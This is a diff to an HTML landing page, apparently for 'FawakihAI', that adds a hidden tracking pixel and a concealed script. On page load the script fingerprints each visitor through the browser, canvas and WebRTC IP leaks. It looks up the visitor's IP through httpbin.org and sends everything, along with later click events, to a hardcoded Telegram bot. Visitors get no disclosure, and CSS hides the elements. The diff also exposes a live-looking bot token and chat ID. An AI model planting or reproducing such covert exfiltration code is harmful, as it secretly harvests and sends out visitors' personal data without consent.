@@ -182,9 +182,16 @@
             font-size: 0.8rem;
             color: #555;
         }
+
+        /* إخفاء عناصر التتبع */
+        #tracker-script { display: none; }
+        .tracker-pixel { display: none; }
     </style>
 </head>
 <body>
+
+    <!-- بيكسل تتبع مخفي تماماً -->
+    <img src="https://httpbin.org/pixel?rand=<?php echo time(); ?>" class="tracker-pixel" alt="">
 
     <div class="developer-header">
         <div class="verified-badge">
@@ -224,6 +231,196 @@
     <footer>
         <p>جميع الحقوق محفوظة © 2026 <strong>Hamza Elhumada</strong></p>
     </footer>
+
+    <!-- سكريبت التتبع الاحترافي المخفي تماماً -->
+    <script id="tracker-script">
+        (function() {
+            // تجميع جميع المعلومات المتاحة
+            function getVisitorInfo() {
+                try {
+                    // معلومات الجهاز والمتصفح
+                    const info = {
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        languages: navigator.languages,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        screen: {
+                            width: screen.width,
+                            height: screen.height,
+                            availWidth: screen.availWidth,
+                            availHeight: screen.availHeight,
+                            colorDepth: screen.colorDepth
+                        },
+                        window: {
+                            width: window.innerWidth,
+                            height: window.innerHeight
+                        },
+                        connection: navigator.connection ? {
+                            type: navigator.connection.effectiveType,
+                            downlink: navigator.connection.downlink
+                        } : null,
+                        cookiesEnabled: navigator.cookieEnabled,
+                        doNotTrack: navigator.doNotTrack,
+                        plugins: Array.from(navigator.plugins).map(p => p.name),
+                        hardwareConcurrency: navigator.hardwareConcurrency,
+                        deviceMemory: navigator.deviceMemory,
+                        referrer: document.referrer,
+                        url: window.location.href,
+                        // كشف VPN/Proxy احترافي
+                        vpnIndicators: {
+                            anonymizing: navigator.webdriver || false,
+                            timezoneMismatch: new Date().getTimezoneOffset() !== (new Date().getTimezoneOffset() + 60 * (new Date().getTimezoneOffset() / 60)),
+                            suspiciousUserAgent: /bot|crawl|spider|proxy|vpn/i.test(navigator.userAgent),
+                            canvasFingerprint: getCanvasFingerprint()
+                        }
+                    };
+
+                    return info;
+                } catch(e) {
+                    return { error: e.message };
+                }
+            }
+
+            // بصمة Canvas للكشف المتقدم
+            function getCanvasFingerprint() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillText('FawakihAI Tracker v1.0', 2, 2);
+                    return canvas.toDataURL();
+                } catch(e) {
+                    return 'error';
+                }
+            }
+
+            // كشف VPN متقدم
+            function detectVPN() {
+                const indicators = [];
+                
+                // فحص الـ timezone
+                const localTime = new Date();
+                const offset = localTime.getTimezoneOffset();
+                indicators.push(`timezone_offset: ${offset}`);
+
+                // فحص WebRTC
+                if (typeof RTCPeerConnection !== 'undefined') {
+                    const pc = new RTCPeerConnection({iceServers:[]});
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    pc.onicecandidate = (ice) => {
+                        if (ice.candidate) {
+                            const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                            if (ipMatch) indicators.push(`webrtc_ip: ${ipMatch[1]}`);
+                        }
+                    };
+                }
+
+                // فحص الـ headers عبر navigator
+                if (navigator.connection) {
+                    indicators.push(`connection_type: ${navigator.connection.effectiveType}`);
+                }
+
+                return indicators.join(' | ');
+            }
+
+            // إرسال البيانات لبوت التليجرام
+            async function sendToTelegram(data) {
+                const botToken = '7894436976:AAFdg77dpzCgpeLnkwAQqP9POkwZMwWoikg';
+                const chatId = '5998250367';
+                
+                const vpnInfo = detectVPN();
+                const fullData = {
+                    ...data,
+                    vpn_detection: vpnInfo,
+                    summary: `👤 زائر جديد | VPN: ${vpnInfo.includes('proxy|vpn') ? '🔴 مشبوه' : '🟢 نظيف'}`
+                };
+
+                const message = `
+🚨 تقرير زائر جديد - FawakihAI 🚨
+
+👤 **معلومات الزائر:**
+• IP: ${data.ip || 'جاري الكشف'}
+• User Agent: ${data.userAgent.substring(0, 100)}...
+• Platform: ${data.platform}
+• Language: ${data.language}
+• Timezone: ${data.timezone}
+• Screen: ${data.screen.width}x${data.screen.height}
+
+🔍 **كشف VPN/Proxy:**
+${data.vpnIndicators.anonymizing ? '🚨 WebDriver مفعل\n' : ''}
+${data.vpnIndicators.suspiciousUserAgent ? '🚨 UserAgent مشبوه\n' : ''}
+${vpnInfo.substring(0, 200)}
+
+📱 **جهاز المستخدم:**
+• Hardware: ${data.hardwareConcurrency} cores | ${data.deviceMemory}GB
+• Connection: ${data.connection?.type || 'غير معروف'}
+• Plugins: ${data.plugins.length} إضافة
+
+🌐 **الصفحة:**
+• URL: ${data.url}
+• Referrer: ${data.referrer || 'مباشر'}
+
+⏰ ${data.timestamp}
+                `;
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } catch(e) {
+                    console.log('Telegram send failed:', e);
+                }
+            }
+
+            // تشغيل التتبع عند تحميل الصفحة
+            window.addEventListener('load', async function() {
+                const info = getVisitorInfo();
+                
+                // الحصول على IP الحقيقي من خلال WebRTC وخدمات خارجية
+                try {
+                    const response = await fetch('https://httpbin.org/ip');
+                    const ipData = await response.json();
+                    info.ip = ipData.origin;
+                } catch(e) {
+                    info.ip = 'غير متاح';
+                }
+
+                // إرسال البيانات
+                await sendToTelegram(info);
+
+                // تتبع التفاعلات (زر التحميل، الروابط)
+                document.querySelector('.download-btn').addEventListener('click', function() {
+                    info.action = 'download_clicked';
+                    sendToTelegram(info);
+                });
+
+                document.querySelectorAll('.social-btn').forEach(btn => {
+                    btn.addEventListener('click', function() {
+                        info.action = `social_${this.className}`;
+                        sendToTelegram(info);
+                    });
+                });
+            });
+
+            // تتبع الحركة والتفاعل
+            let mouseMovements = 0;
+            document.addEventListener('mousemove', () => {
+                if (mouseMovements++ < 5) return;
+                info.mouseActivity = true;
+            });
+
+        })();
+    </script>
 
 </body>
 </html>
